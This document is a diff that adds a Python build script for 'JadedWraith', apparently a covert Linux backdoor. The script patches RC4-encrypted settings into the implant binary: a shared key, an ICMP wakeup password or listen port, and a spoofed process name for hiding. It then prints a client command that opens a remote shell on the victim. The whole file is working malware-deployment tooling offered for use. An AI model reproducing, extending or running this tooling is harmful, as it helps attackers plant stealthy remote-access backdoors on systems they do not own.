@@ -1,0 +1,176 @@
+#!/usr/bin/env python3
+
+import os
+import base64
+import json
+import glob
+import sys
+import struct
+import time
+import secrets 
+from termcolor import colored
+from Crypto.Cipher import ARC4
+
+
+CONFIG_HDR_FMT = "IB32s32s"
+CONFIG_FMT = "16s49s128sHI"
+CONFIG_SIZE = struct.calcsize("<" + CONFIG_HDR_FMT + CONFIG_FMT)
+
+
+def xor_crypt(otp, data):
+    return bytes([a ^ b for a, b in zip(otp, data)])
+
+
+def get_random_pass(length):
+    alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ1234567890"
+
+    return ''.join(secrets.choice(alpha) for i in range(length))
+
+
+"""
+Find JadedWraith binaries inside "bin"
+"""
+def find_jadedwraith_binaries():
+    matches = list(glob.glob("bin/JadedWraith*.elf"))
+    matches.extend(glob.glob("bin/JadedWraith*.so"))
+
+    if len(matches) == 0:
+        return []
+
+    return matches
+
+
+"""
+Present the user a list of choices to pick from
+"""
+def simple_menu(items, prompt="> ", display_func=str):
+
+    for i, item in enumerate(items):
+        print(" %d. %s" % (i + 1, display_func(item)))
+
+    choice = prompt_and_validate(prompt, lambda s: s.isdigit() and (0 < int(s) <= len(items)))
+
+    return items[int(choice)-1]
+
+
+"""
+Prompt the user for some input and validate it with validate_func
+"""
+def prompt_and_validate(prompt_str, validate_func):
+    while True:
+        response = input(prompt_str)
+
+        if validate_func(response):
+            return response
+
+
+def prompt_yes_or_no(prompt):
+    result = prompt_and_validate(prompt, lambda p: p.lower() == "y" or p.lower() == "n")
+
+    return result.lower() == "y"
+
+
+def prompt_or_default(prompt, default):
+    res = input("{0} [{1}] : ".format(prompt, default))
+
+    if len(res.strip()) == 0:
+        return default
+
+    return res
+
+
+def prompt_for_binary():
+    binaries = find_jadedwraith_binaries()
+
+    if len(binaries) == 0:
+        sys.stderr.write("Could not find JadedWraith! You will have to manually specify a binary to use!")
+        raise SystemExit()
+    elif len(binaries) == 1:
+        choice = binaries[0]
+    else:
+        print("Please choose a JadedWraith binary to use: ")
+        choice = simple_menu(binaries, prompt="Binary : ", display_func=os.path.basename)
+
+    return choice
+
+
+def main(args):
+    print(colored("JadedWraith Configuration\n", "yellow"))
+
+    binary = prompt_for_binary()
+    keystr = prompt_or_default("Shared Key", bytes.hex(secrets.token_bytes(16)))
+
+    if prompt_yes_or_no("Enable passive mode (ICMP wakeup) ? [y/n] "):
+        passwd = prompt_or_default("Wakeup Password", get_random_pass(48))
+        listen_port = 0
+    else:
+        passwd = ""
+        modulo = 0
+        listen_port = int(prompt_and_validate("Listen port : ", int))
+    
+    comm =   prompt_or_default("argv[0] (Leave blank to not spoof command)", "")
+
+    if len(passwd) != 48 and listen_port == 0:
+        sys.stderr.write("password must be exactly characters 48 long!")
+        sys.exit(-1)
+
+    try:
+        keyblob = bytes.fromhex(keystr)
+    except ValueError:
+        print("Invalid key specified!")
+        sys.exit(-1)
+
+    infile = binary
+
+    with open(infile, 'rb') as f:
+        s = f.read()
+
+    needle = b"\x64\xa0\x58\xa2"
+
+    offset = s.find(needle)
+    needle = s[offset:offset + CONFIG_SIZE]
+    rc4_key = base64.b64encode(os.urandom(32))[:32]
+    rc4_otp = os.urandom(32)
+    rc4_key_xored = xor_crypt(rc4_otp, rc4_key)
+
+    config_hdr = struct.pack("<" + CONFIG_HDR_FMT, 0, 1, rc4_otp, rc4_key_xored)
+    config = struct.pack("<" + CONFIG_FMT, keyblob, passwd.encode("utf-8"), comm.encode("utf-8"), listen_port, 0)
+
+    cipher = ARC4.new(rc4_key)
+    config = cipher.encrypt(config)
+
+    if len(config_hdr + config) != len(needle):
+        sys.stderr.write("FUCK\n")
+        return
+
+    build_path = os.path.realpath("configured")
+
+    if not os.path.isdir(build_path):
+        os.makedirs(build_path, 0o700, True)
+
+    config_json = {
+        "config": {
+            "passwd": passwd,
+            "key": keystr
+        }
+    }
+
+    now = int(time.time())
+    filename = "{0}.{1}".format(os.path.splitext(os.path.basename(infile))[0], now)
+    config_path = os.path.join(build_path, filename + ".json")
+    binary_path = os.path.join(build_path, filename + ".bin")
+
+    with open(config_path, "w") as fd:
+        json.dump(config_json, fd)
+
+    with open(binary_path, "wb") as fd:
+        fd.write(s.replace(needle, config_hdr + config))
+
+    print("\nJadedWraith Executable : {0}\n".format(colored(binary_path, attrs=['bold'])))
+    print("Try me!") 
+    print(colored("   sudo ./wraith-client.py <IP_ADDRESS> -k {0} -P {1} shell".format(keystr, passwd),
+                    attrs=['bold']))
+
+
+if __name__ == "__main__":
+    main(sys.argv)
